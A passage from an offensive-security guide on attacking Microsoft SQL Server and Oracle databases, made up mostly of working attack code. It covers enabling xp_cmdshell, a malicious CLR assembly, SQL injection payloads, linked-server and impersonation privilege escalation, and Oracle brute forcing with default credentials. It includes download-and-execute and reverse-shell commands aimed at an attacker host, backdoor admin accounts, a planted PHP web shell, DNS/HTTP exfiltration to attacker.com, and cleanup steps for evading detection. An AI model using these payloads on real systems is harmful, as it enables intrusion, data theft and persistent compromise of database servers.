```

**[Unverified]** Legacy MSSQL Express installations (pre-2008) sometimes deployed with blank SA passwords. Modern versions enforce strong passwords during installation, but legacy systems or rapid deployments may still use weak credentials.

#### Testing SA Access

**Using mssqlclient.py** (Impacket):

```bash
# Linux connection tool
mssqlclient.py -port 1433 sa:'password'@<target>

# Windows authentication format
mssqlclient.py -port 1433 DOMAIN/user:'password'@<target> -windows-auth
```

**Using sqsh** (interactive SQL shell):

```bash
sqsh -S <target> -U sa -P 'password'

# Test connection
1> SELECT @@VERSION;
2> GO
```

**Using DBeaver/SQL Server Management Studio** - GUI alternatives for confirming access and exploring database structure post-compromise.

#### Post-Authentication Enumeration

Once authenticated as `sa`:

```sql
-- Check current user privileges
SELECT IS_SRVROLEMEMBER('sysadmin');
-- Returns 1 if sysadmin, 0 otherwise

-- List all logins
SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S','U');

-- Check SQL Server version
SELECT @@VERSION;

-- List databases
SELECT name FROM sys.databases;

-- Check linked servers (lateral movement opportunity)
EXEC sp_linkedservers;
```

### xp_cmdshell Activation

`xp_cmdshell` is an extended stored procedure allowing SQL Server to execute operating system commands via `cmd.exe`. Disabled by default on modern installations for security reasons.

#### Checking xp_cmdshell Status

```sql
-- Check if xp_cmdshell exists and is enabled
EXEC sp_configure 'xp_cmdshell';
```

Returns `run_value` of `1` (enabled) or `0` (disabled).

#### Enabling xp_cmdshell

**Requirements**: `sysadmin` role membership (SA account has this by default)

```sql
-- Enable advanced options
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Single-line version**:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

#### Executing Commands via xp_cmdshell

```sql
-- Basic command execution
EXEC xp_cmdshell 'whoami';

-- Execute command and capture output
EXEC xp_cmdshell 'ipconfig';

-- PowerShell download and execute
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<attacker-ip>/shell.ps1'')"';

-- Download file with certutil
EXEC xp_cmdshell 'certutil -urlcache -f http://<attacker-ip>/nc.exe C:\Windows\Temp\nc.exe';

-- Execute reverse shell
EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe <attacker-ip> 4444 -e cmd.exe';
```

**Output Handling**: `xp_cmdshell` returns results as table rows. Use output redirection or capture in SQL variables for programmatic handling:

```sql
-- Store output in temporary table
CREATE TABLE #output (line VARCHAR(8000));
INSERT INTO #output EXEC xp_cmdshell 'systeminfo';
SELECT * FROM #output;
```

#### Metasploit Automation

```bash
use exploit/windows/mssql/mssql_payload
set PAYLOAD windows/meterpreter/reverse_tcp
set RHOSTS <target>
set USERNAME sa
set PASSWORD password
set LHOST <attacker-ip>
exploit
```

**[Inference]** This module automatically enables `xp_cmdshell` if disabled and the user has sufficient privileges.

#### Evasion and Cleanup

**Disable xp_cmdshell after exploitation**:

```sql
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
EXEC sp_configure 'show advanced options', 0;
RECONFIGURE;
```

**Note**: Security logs may still capture the configuration changes (`Event ID 15457` for configuration changes).

### CLR Assembly Loading for RCE

Common Language Runtime (CLR) integration allows .NET assemblies to run within SQL Server's process space, providing code execution without relying on `xp_cmdshell`.

#### CLR Exploitation Prerequisites

1. `sysadmin` role or `CREATE ASSEMBLY` permission
2. `clr enabled` configuration option set to `1`
3. Database set to `TRUSTWORTHY ON` (or assembly signed with asymmetric key)

#### Enabling CLR Integration

```sql
-- Enable CLR
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;

-- Set database to trustworthy (required for UNSAFE assemblies)
ALTER DATABASE [master] SET TRUSTWORTHY ON;
```

#### Creating Malicious CLR Assembly

**C# Source Code** (`cmd_exec.cs`):

```csharp
using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;
using System.Diagnostics;
using System.Text;

public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmd_exec(SqlString execCommand)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();

        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
        SqlContext.Pipe.SendResultsStart(record);
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
        SqlContext.Pipe.SendResultsRow(record);
        SqlContext.Pipe.SendResultsEnd();
        proc.WaitForExit();
        proc.Close();
    }
}
```

**Compile on Windows** (requires .NET Framework):

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:cmd_exec.dll cmd_exec.cs
```

Or **Linux with Mono**:

```bash
mcs -target:library -out:cmd_exec.dll cmd_exec.cs
```

#### Loading Assembly into MSSQL

**Convert DLL to hexadecimal**:

```bash
# Linux
xxd -p cmd_exec.dll | tr -d '\n' > cmd_exec.hex

# PowerShell (Windows)
$hexString = [System.IO.File]::ReadAllBytes("cmd_exec.dll") | ForEach-Object { $_.ToString("X2") } -join ''
```

**Load via SQL** (replace `<HEX_STRING>` with actual hex):

```sql
-- Create assembly from binary hex
CREATE ASSEMBLY cmd_exec
FROM 0x<HEX_STRING>
WITH PERMISSION_SET = UNSAFE;

-- Create stored procedure wrapper
CREATE PROCEDURE cmd_exec
@execCommand NVARCHAR(4000)
AS EXTERNAL NAME cmd_exec.StoredProcedures.cmd_exec;
GO
```

**Alternative - Direct file loading** (if file system access available):

```sql
CREATE ASSEMBLY cmd_exec
FROM 'C:\temp\cmd_exec.dll'
WITH PERMISSION_SET = UNSAFE;
```

#### Executing Commands via CLR Assembly

```sql
-- Execute commands
EXEC cmd_exec 'whoami';
EXEC cmd_exec 'ipconfig';
EXEC cmd_exec 'powershell -enc <base64_payload>';
```

#### Automated CLR Exploitation Tools

**PowerUpSQL** (PowerShell module):

```powershell
# Import module
Import-Module PowerUpSQL

# Execute OS command via CLR
Invoke-SQLOSCmd -Instance "<target>" -Username sa -Password password -Command "whoami"
```

**Metasploit CLR Module**:

```bash
use exploit/windows/mssql/mssql_clr_payload
set RHOSTS <target>
set USERNAME sa
set PASSWORD password
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker-ip>
exploit
```

#### Cleanup and Forensics

**Remove assembly**:

```sql
DROP PROCEDURE cmd_exec;
DROP ASSEMBLY cmd_exec;
```

**Disable CLR**:

```sql
EXEC sp_configure 'clr enabled', 0;
RECONFIGURE;
ALTER DATABASE [master] SET TRUSTWORTHY OFF;
```

**[Inference]** CLR assemblies remain in `sys.assemblies` catalog view even after dropping, leaving forensic artifacts. Complete cleanup requires reviewing assembly metadata and transaction logs.

### Key Defensive Indicators

When exploiting MSSQL, be aware these actions generate logs/alerts:

1. **Failed authentication attempts** - SQL Server Error Log, Event ID 18456
2. **xp_cmdshell execution** - SQL Audit logs if configured
3. **Configuration changes** (`sp_configure`) - Event ID 15457
4. **CLR assembly creation** - DDL triggers may capture `CREATE ASSEMBLY` events
5. **TRUSTWORTHY database changes** - Audited in security-conscious environments

---

**Recommended Related Topics**:

- MSSQL Lateral Movement (linked servers, `OPENROWSET`, `OPENQUERY`)
- MSSQL Privilege Escalation (impersonation, trustworthy databases)
- MSSQL Post-Exploitation (credential extraction from memory/disk)

---

### SQL Injection in MSSQL Context

SQL injection in Microsoft SQL Server environments presents unique opportunities beyond standard injection techniques due to MSSQL's extended stored procedures, command execution capabilities, and linked server functionality.

#### Detection and Enumeration

**Basic Detection Patterns:**

```sql
' OR 1=1--
' OR '1'='1
'; WAITFOR DELAY '00:00:05'--
```

**MSSQL-Specific Version Detection:**

```sql
' UNION SELECT @@version--
' AND 1=CONVERT(int,@@version)--
```

The `@@version` global variable returns detailed MSSQL version information including build numbers and OS details.

**Database Enumeration:**

```sql
' UNION SELECT name FROM master..sysdatabases--
' UNION SELECT DB_NAME()--
' UNION SELECT SCHEMA_NAME()--
```

**Table and Column Discovery:**

```sql
' UNION SELECT name FROM sysobjects WHERE xtype='U'--
' UNION SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='tablename')--

-- Using Information Schema
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
```

#### Error-Based Injection

MSSQL error messages can be verbose and reveal data through type conversion errors:

```sql
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysdatabases))--
' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--
```

The `CONVERT()` function forces type conversion, triggering errors that include the data being converted.

#### Boolean-Based Blind Injection

```sql
' AND LEN(DB_NAME())=6--
' AND SUBSTRING(DB_NAME(),1,1)='m'--
' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysdatabases),1,1))>97--
```

#### Time-Based Blind Injection

```sql
'; IF (1=1) WAITFOR DELAY '00:00:05'--
'; IF (SELECT COUNT(*) FROM users WHERE username='admin')>0 WAITFOR DELAY '00:00:05'--
'; IF (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') WAITFOR DELAY '00:00:05'--
```

The `WAITFOR DELAY` command causes execution to pause, enabling time-based data extraction.

#### Stacked Queries

MSSQL supports stacked queries (multiple statements separated by semicolons), enabling arbitrary command execution:

```sql
'; DROP TABLE temp_table--
'; INSERT INTO users VALUES ('attacker','password')--
'; EXEC xp_cmdshell 'whoami'--
```

[Inference] Stacked query support depends on application architecture and driver configuration; not all MSSQL connections permit multiple statements.

#### Command Execution via xp_cmdshell

**Enabling xp_cmdshell:**

```sql
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--
```

**Executing Commands:**

```sql
'; EXEC xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'net user attacker P@ssw0rd /add'--
'; EXEC xp_cmdshell 'net localgroup administrators attacker /add'--
```

**Alternative Execution Methods:**

```sql
-- Using sp_OACreate for command execution
DECLARE @output INT;
EXEC sp_OACreate 'WScript.Shell', @output OUTPUT;
EXEC sp_OAMethod @output, 'Run', NULL, 'cmd.exe /c whoami';

-- Using xp_regwrite for persistence
EXEC xp_regwrite 'HKEY_LOCAL_MACHINE','Software\Microsoft\Windows\CurrentVersion\Run','backdoor','REG_SZ','C:\backdoor.exe'
```

[Unverified] The effectiveness of `sp_OACreate` depends on whether OLE Automation Procedures are enabled in the MSSQL configuration.

#### Reading Files

```sql
-- Using OPENROWSET with BULK
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS correlation_name

-- Using xp_dirtree to list directories
EXEC xp_dirtree 'C:\inetpub\wwwroot',1,1
```

#### Writing Files

```sql
-- Creating files via BCP utility
EXEC xp_cmdshell 'bcp "SELECT ''<?php system($_GET[cmd]); ?>'' " queryout C:\inetpub\wwwroot\shell.php -c -Slocalhost -T'

-- Using OPENROWSET to write
INSERT INTO OPENROWSET('Microsoft.ACE.OLEDB.12.0','Text;Database=C:\;','SELECT * FROM [shell.php]') VALUES ('<?php system($_GET[cmd]); ?>')
```

#### Hash Extraction

```sql
-- MSSQL 2000-2005
SELECT name, password FROM master..sysxlogins
SELECT name, password_hash FROM sys.sql_logins

-- MSSQL 2008+
SELECT name, password_hash FROM sys.sql_logins
```

MSSQL password hashes use SHA-512 for SQL authentication. The hashes can be cracked offline or used in pass-the-hash attacks.

#### Automated Tools

**sqlmap:**

```bash
# Basic injection
sqlmap -u "http://target.com/page.aspx?id=1" --dbs

# MSSQL-specific options
sqlmap -u "http://target.com/page.aspx?id=1" --dbms=mssql --os-shell

# Command execution
sqlmap -u "http://target.com/page.aspx?id=1" --sql-shell

# File operations
sqlmap -u "http://target.com/page.aspx?id=1" --file-read="C:\boot.ini"
sqlmap -u "http://target.com/page.aspx?id=1" --file-write="shell.aspx" --file-dest="C:\inetpub\wwwroot\shell.aspx"
```

### Linked Server Exploitation

MSSQL linked servers allow one database server to execute commands on another, creating lateral movement opportunities within database infrastructure.

#### Enumerating Linked Servers

```sql
-- List all linked servers
EXEC sp_linkedservers
SELECT * FROM sys.servers WHERE is_linked = 1

-- Get detailed configuration
EXEC sp_helpserver
SELECT * FROM sys.linked_logins
```

**Using openquery:**

```sql
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT @@version')
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT SYSTEM_USER')
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT name FROM master..sysdatabases')
```

#### Executing Commands on Linked Servers

```sql
-- Direct execution
EXEC('SELECT @@version') AT [LINKED_SERVER]

-- Nested execution (chaining through multiple servers)
EXEC('EXEC(''SELECT @@version'') AT [SECOND_LINKED_SERVER]') AT [FIRST_LINKED_SERVER]

-- Command execution via xp_cmdshell on linked server
EXEC('EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER]
```

#### Linked Server Crawling

**Automated Discovery:**

```sql
-- Recursive linked server enumeration
WITH linked_servers AS (
    SELECT srv.name, srv.is_linked, 0 AS depth
    FROM sys.servers srv
    WHERE srv.is_linked = 1
    UNION ALL
    SELECT srv.name, srv.is_linked, ls.depth + 1
    FROM linked_servers ls
    CROSS APPLY OPENQUERY(ls.name, 'SELECT name, is_linked FROM sys.servers WHERE is_linked=1') srv
    WHERE ls.depth < 5
)
SELECT DISTINCT name, depth FROM linked_servers
```

[Inference] This recursive query assumes all intermediate servers allow OPENQUERY access; firewall rules or authentication failures may interrupt the chain.

**PowerUpSQL for Linked Server Discovery:**

```powershell
# From attacking machine with PowerShell
Import-Module PowerUpSQL

# Crawl linked servers
Get-SQLServerLinkCrawl -Instance "MSSQL01" -Username sa -Password Password123

# Execute commands across linked servers
Get-SQLServerLinkCrawl -Instance "MSSQL01" -Username sa -Password Password123 -Query "EXEC xp_cmdshell 'whoami'"
```

#### Exploitation Techniques

**Double-Hop Authentication:** When credentials are stored for linked servers, you can authenticate through multiple hops:

```sql
-- Check linked login configuration
SELECT * FROM sys.linked_logins WHERE remote_name IS NOT NULL

-- Execute with stored credentials
EXEC('EXEC xp_cmdshell ''net user attacker P@ssw0rd /add''') AT [LINKED_SERVER]
```

**RPC Out Configuration:**

```sql
-- Check RPC configuration
EXEC sp_helpserver

-- Enable RPC Out (if you have privileges)
EXEC sp_serveroption @server='LINKED_SERVER', @optname='rpc out', @optvalue='true'

-- Execute commands using RPC
EXEC [LINKED_SERVER].master.dbo.xp_cmdshell 'whoami'
```

**Data Exfiltration via Linked Servers:**

```sql
-- Copy data between servers
INSERT INTO [LINKED_SERVER].database.dbo.exfil_table
SELECT * FROM sensitive_database.dbo.passwords

-- Exfiltrate via DNS (if xp_cmdshell available)
DECLARE @data VARCHAR(1024)
SELECT @data = password FROM users WHERE username='admin'
EXEC('EXEC xp_cmdshell ''nslookup '+@data+'.attacker.com''') AT [LINKED_SERVER]
```

### Impersonation Abuse

MSSQL impersonation allows a user to temporarily adopt the security context of another user or login, potentially escalating privileges.

#### Understanding Impersonation

MSSQL provides two primary impersonation methods:

- `EXECUTE AS LOGIN` - Impersonate at server level
- `EXECUTE AS USER` - Impersonate at database level

#### Enumerating Impersonation Privileges

```sql
-- Check who you can impersonate
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE'

-- List logins that can be impersonated
SELECT pe.state_desc, pe.permission_name, pr.name AS principal_name
FROM sys.server_permissions pe
JOIN sys.server_principals pr ON pe.grantor_principal_id = pr.principal_id
WHERE pe.permission_name = 'IMPERSONATE'

-- Database-level impersonation
SELECT * FROM sys.database_permissions WHERE permission_name = 'IMPERSONATE'
```

**Current Security Context:**

```sql
SELECT SYSTEM_USER  -- Current login
SELECT USER_NAME()  -- Current database user
SELECT IS_SRVROLEMEMBER('sysadmin')  -- Check if sysadmin
```

#### Executing Impersonation

**Server-Level Impersonation:**

```sql
-- Impersonate sa account
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER  -- Should show 'sa'

-- Execute commands as sa
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE

-- Revert to original context
REVERT
```

**Database-Level Impersonation:**

```sql
-- Impersonate database owner
EXECUTE AS USER = 'dbo'
SELECT USER_NAME()  -- Should show 'dbo'

-- Perform privileged operations
SELECT * FROM sensitive_table

-- Revert
REVERT
```

**Nested Impersonation:**

```sql
-- Chain multiple impersonations
EXECUTE AS LOGIN = 'dbadmin'
EXECUTE AS USER = 'dbo'
-- Perform actions
REVERT  -- Back to dbadmin
REVERT  -- Back to original user
```

#### Common Privilege Escalation Paths

**Escalating via db_owner Role:**

```sql
-- If you have db_owner on msdb database
USE msdb
EXECUTE AS USER = 'dbo'
EXEC sp_add_job @job_name = 'privesc'
EXEC sp_add_jobstep @job_name = 'privesc', @step_name = 'step1', 
     @subsystem = 'CmdExec', @command = 'net user attacker P@ssw0rd /add'
EXEC sp_start_job @job_name = 'privesc'
```

[Inference] SQL Server Agent must be running for job-based privilege escalation; if the service is stopped, this technique will fail.

**Escalating via TRUSTWORTHY Database:**

```sql
-- Check for TRUSTWORTHY databases
SELECT name, is_trustworthy_on FROM sys.databases WHERE is_trustworthy_on = 1

-- If database is TRUSTWORTHY and you have db_owner
USE trustworthy_db
EXECUTE AS USER = 'dbo'

-- Create stored procedure to execute as dbo (who maps to sa)
CREATE PROCEDURE sp_elevate
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'low_priv_user', 'sysadmin'
GO

-- Execute the procedure
EXEC sp_elevate
```

The TRUSTWORTHY property allows assemblies and modules in the database to access resources outside the database under the security context of the database owner.

**PowerUpSQL Impersonation Module:**

```powershell
# Check for impersonation opportunities
Invoke-SQLAuditPrivImpersonateLogin -Instance "MSSQL01" -Username user -Password pass

# Automatically exploit impersonation
Invoke-SQLEscalatePriv -Instance "MSSQL01" -Username user -Password pass
```

#### Defensive Queries

```sql
-- Audit impersonation permissions
SELECT 
    pr.name AS grantee,
    pe.permission_name,
    pe.state_desc,
    pr2.name AS impersonated_login
FROM sys.server_permissions pe
JOIN sys.server_principals pr ON pe.grantee_principal_id = pr.principal_id
LEFT JOIN sys.server_principals pr2 ON pe.major_id = pr2.principal_id
WHERE pe.permission_name = 'IMPERSONATE'

-- Check TRUSTWORTHY databases
SELECT name FROM sys.databases WHERE is_trustworthy_on = 1 AND name != 'msdb'
```

#### Tool Reference Summary

**MSSQL Exploitation Tools:**

- **sqlmap** - Automated SQL injection and database takeover
- **PowerUpSQL** - PowerShell toolkit for MSSQL assessment
- **msdat** - Microsoft SQL Database Attacking Tool (Python)
- **mssqlclient.py** (Impacket) - MSSQL client with built-in exploitation features

**mssqlclient.py Examples:**

```bash
# Connect to MSSQL
mssqlclient.py DOMAIN/user:password@10.10.10.10

# Windows authentication
mssqlclient.py DOMAIN/user:password@10.10.10.10 -windows-auth

# Enable xp_cmdshell
SQL> enable_xp_cmdshell

# Execute commands
SQL> xp_cmdshell whoami

# Check impersonation
SQL> SELECT * FROM sys.server_permissions WHERE permission_name='IMPERSONATE'
```

---

**Key Recommendations for Further Study:**

- **Advanced Impersonation**: Certificate-based impersonation and cross-database ownership chaining
- **MSSQL Post-Exploitation**: Persistence mechanisms including triggers, SQL Agent jobs, and CLR assemblies
- **Network Protocols**: Exploitation of SQL Server Resolution Protocol (SSRP) and SQL Browser service

---

## Oracle Database Exploitation

### Brute force Oracle

Oracle databases commonly listen on TCP port 1521 (default listener port) and use the TNS (Transparent Network Substrate) protocol. Brute forcing Oracle requires understanding the SID (System Identifier) or Service Name before attempting authentication.

**SID/Service Name Enumeration**

```bash
# Using tnscmd10g to enumerate Oracle TNS listener
tnscmd10g version -h <target_ip> -p 1521
tnscmd10g status -h <target_ip> -p 1521

# Using ODAT (Oracle Database Attacking Tool)
odat sidguesser -s <target_ip> -p 1521

# Using Nmap NSE scripts
nmap -p 1521 --script oracle-sid-brute <target_ip>
nmap -p 1521 --script oracle-enum-users --script-args sid=XE <target_ip>

# Metasploit SID enumeration
use auxiliary/scanner/oracle/sid_enum
set RHOSTS <target_ip>
run
```

**Credential Brute Forcing**

```bash
# Using Hydra (requires known SID)
hydra -L users.txt -P passwords.txt <target_ip> oracle-listener
hydra -L users.txt -P passwords.txt <target_ip> oracle-sid -s 1521

# Using ODAT for password guessing
odat passwordguesser -s <target_ip> -p 1521 -d XE --accounts-file accounts.txt

# Using Metasploit
use auxiliary/scanner/oracle/oracle_login
set RHOSTS <target_ip>
set SID XE
set USER_FILE /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
set BLANK_PASSWORDS true
run

# Using Ncrack
ncrack -U users.txt -P passwords.txt <target_ip>:1521
```

**Tool-Specific Considerations**

- **ODAT**: Most comprehensive Oracle-specific tool, requires `cx_Oracle` Python library
- **Hydra**: May have stability issues with Oracle modules
- **Metasploit**: Reliable but slower for large wordlists
- **Patator**: Alternative with better threading control

```bash
# Patator example
patator oracle_login host=<target_ip> sid=XE user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:code=ORA-01017
```

**Common Issues**

- Locked accounts after failed attempts (default: 10 failed attempts)
- TNS listener may filter connections by IP
- Case sensitivity in Oracle usernames (typically uppercase)
- Connection timeout configurations may slow brute force attempts

---

### Default credentials (system/sys)

Oracle databases ship with several privileged accounts that are frequent targets. The two most critical are `SYS` and `SYSTEM`.

**Privileged Default Accounts**

|Username|Default Password|Role|Notes|
|---|---|---|---|
|SYS|CHANGE_ON_INSTALL|SYSDBA|Highest privilege account|
|SYSTEM|MANAGER|DBA|Administrative account|
|SYSMAN|oem_temp|SYSMAN|Enterprise Manager account|
|DBSNMP|dbsnmp|Monitoring|SNMP monitoring account|
|SCOTT|TIGER|User|Sample schema account (often present)|
|OUTLN|OUTLN|User|Stored outlines account|
|CTXSYS|CTXSYS|DBA|Oracle Text account|
|MDSYS|MDSYS|DBA|Spatial data account|

**Testing Default Credentials**

```bash
# Using sqlplus (requires Oracle Instant Client)
sqlplus SYS/CHANGE_ON_INSTALL@<target_ip>:1521/XE as sysdba
sqlplus SYSTEM/MANAGER@<target_ip>:1521/XE

# Using ODAT
odat passwordguesser -s <target_ip> -p 1521 -d XE --accounts-file default_creds.txt
odat all -s <target_ip> -p 1521 -d XE -U SYS -P CHANGE_ON_INSTALL --sysdba

# Using Metasploit with default credential list
use auxiliary/scanner/oracle/oracle_login
set RHOSTS <target_ip>
set SID XE
set USER_FILE /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
set BLANK_PASSWORDS true
run
```

**Creating Default Credential Wordlist**

```bash
# Create accounts.txt for ODAT
cat > default_oracle_creds.txt << EOF
SYS:CHANGE_ON_INSTALL
SYSTEM:MANAGER
SYSMAN:oem_temp
DBSNMP:dbsnmp
SCOTT:TIGER
OUTLN:OUTLN
CTXSYS:CTXSYS
MDSYS:MDSYS
WMSYS:WMSYS
XDB:CHANGE_ON_INSTALL
EXFSYS:EXFSYS
ORACLE_OCM:ORACLE_OCM
DIP:DIP
APEX_PUBLIC_USER:ORACLE
EOF
```

**SYSDBA vs Normal Connection**

```bash
# SYSDBA connection (requires SYS or granted privilege)
sqlplus SYS/password@<target_ip>:1521/XE as sysdba

# SYSOPER connection (operational privileges)
sqlplus SYS/password@<target_ip>:1521/XE as sysoper

# Normal connection
sqlplus SCOTT/TIGER@<target_ip>:1521/XE
```

**Post-Authentication Enumeration**

```sql
-- Check current user privileges
SELECT * FROM session_privs;

-- List all database users
SELECT username, account_status, created FROM dba_users;

-- Check for DBA role
SELECT * FROM dba_role_privs WHERE grantee = USER;

-- List tables accessible to current user
SELECT owner, table_name FROM all_tables;

-- Check Oracle version
SELECT * FROM v$version;
```

**Notes on Modern Installations**

- Oracle 11g and later require strong passwords during installation
- `SCOTT/TIGER` is often locked or removed in newer versions
- Default passwords are frequently changed in production environments
- [Unverified] Some cloud-managed Oracle instances may have additional default accounts specific to the cloud provider

---

### SQL injection in Oracle context

Oracle SQL injection differs from MySQL/PostgreSQL in syntax, built-in functions, and exploitation techniques. Oracle uses PL/SQL and has specific functions for advanced exploitation.

**Basic Oracle SQLi Syntax**

```sql
-- Comment styles
/* Multi-line comment */
-- Single line comment (requires newline after)

-- String concatenation
'admin' || 'istrator'
'admin'||CHR(32)||'user'

-- Oracle doesn't use LIMIT, uses ROWNUM instead
SELECT * FROM users WHERE ROWNUM = 1

-- NULL handling
SELECT banner FROM v$version WHERE 1=1
SELECT NULL FROM dual  -- dual is Oracle's dummy table
```

**Detection and Fingerprinting**

```sql
-- Version detection
' UNION SELECT banner,NULL FROM v$version--
' UNION SELECT version FROM v$instance--

-- Error-based detection
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))--

-- Time-based blind detection
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',10)--
' OR 1=1 AND DBMS_LOCK.SLEEP(5)--

-- Boolean-based detection
' AND 1=1--
' AND 1=2--
```

**UNION-based Exploitation**

```sql
-- Determine column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- Or using UNION
' UNION SELECT NULL FROM dual--
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT NULL,NULL,NULL FROM dual--

-- Determine data types (Oracle requires exact type matching)
' UNION SELECT 'a',NULL,NULL FROM dual--
' UNION SELECT NULL,123,NULL FROM dual--

-- Extract database information
' UNION SELECT banner,NULL,NULL FROM v$version--
' UNION SELECT user,NULL,NULL FROM dual--
' UNION SELECT SYS_CONTEXT('USERENV','CURRENT_USER'),NULL,NULL FROM dual--
' UNION SELECT global_name,NULL,NULL FROM global_name--

-- Extract table names
' UNION SELECT table_name,NULL,NULL FROM all_tables--
' UNION SELECT table_name,NULL,NULL FROM user_tables--

-- Extract column names
' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='USERS'--

-- Extract data
' UNION SELECT username,password,NULL FROM users--
```

**Error-based SQL Injection**

```sql
-- Using UTL_INADDR.GET_HOST_NAME
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT username FROM all_users WHERE ROWNUM=1))--

-- Using CTXSYS.DRITHSX.SN
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT username FROM all_users WHERE ROWNUM=1))--

-- Using XMLType
' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT username FROM all_users WHERE ROWNUM=1)||CHR(62))) FROM dual) IS NULL--

-- Using DBMS_XDB_VERSION.CHECKIN
' AND (SELECT DBMS_XDB_VERSION.CHECKIN((SELECT username FROM all_users WHERE ROWNUM=1)) FROM dual) IS NULL--
```

**Blind SQL Injection**

```sql
-- Time-based blind (using DBMS_PIPE.RECEIVE_MESSAGE)
' AND (SELECT COUNT(*) FROM all_users WHERE username='SYS' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1)>0--

-- Time-based using DBMS_LOCK.SLEEP (requires privileges)
' AND DBMS_LOCK.SLEEP(5)=1--

-- Boolean-based substring extraction
' AND (SELECT SUBSTR(username,1,1) FROM all_users WHERE ROWNUM=1)='S'--
' AND (SELECT ASCII(SUBSTR(username,1,1)) FROM all_users WHERE ROWNUM=1)=83--

-- Boolean-based with DECODE
' AND 1=DECODE(SUBSTR((SELECT username FROM all_users WHERE ROWNUM=1),1,1),'S',1,0)--
```

**Stacked Queries**

[Unverified] Stacked queries support in Oracle depends on the application's API usage and is not consistently available across all contexts.

```sql
-- If supported, use semicolon to separate statements
'; INSERT INTO users VALUES('hacker','password')--
'; UPDATE users SET password='hacked' WHERE username='admin'--
```

**Out-of-Band (OOB) Exfiltration**

```sql
-- DNS exfiltration using UTL_INADDR.GET_HOST_ADDRESS
' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT username FROM all_users WHERE ROWNUM=1)||'.attacker.com') FROM dual) IS NULL--

-- HTTP exfiltration using UTL_HTTP.REQUEST (requires network privileges)
' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT username FROM all_users WHERE ROWNUM=1)) FROM dual) IS NULL--

-- Using DBMS_LDAP.INIT
' AND (SELECT DBMS_LDAP.INIT((SELECT username FROM all_users WHERE ROWNUM=1)||'.attacker.com',80) FROM dual) IS NULL--
```

**Oracle-Specific Functions for SQLi**

```sql
-- String manipulation
SUBSTR('string',start,length)  -- Extract substring
LENGTH('string')               -- String length
INSTR('string','search')       -- Find substring position
REPLACE('string','old','new')  -- Replace text
UPPER('string'), LOWER('string'), INITCAP('string')

-- Conversion functions
TO_CHAR(value)                 -- Convert to string
TO_NUMBER('123')               -- Convert to number
CHR(65)                        -- ASCII to character (returns 'A')
ASCII('A')                     -- Character to ASCII (returns 65)

-- Conditional functions
DECODE(value, match1, result1, match2, result2, default)
CASE WHEN condition THEN result ELSE default END

-- Aggregate functions
LISTAGG(column,',') WITHIN GROUP (ORDER BY column)  -- Concatenate rows (11g+)
```

**Automation with SQLMap**

```bash
# Basic Oracle SQLi scan
sqlmap -u "http://target.com/page?id=1" --dbms=oracle --dump

# With authentication
sqlmap -u "http://target.com/page?id=1" --dbms=oracle --cookie="SESSIONID=abc123" --dump

# Specific database enumeration
sqlmap -u "http://target.com/page?id=1" --dbms=oracle --tables
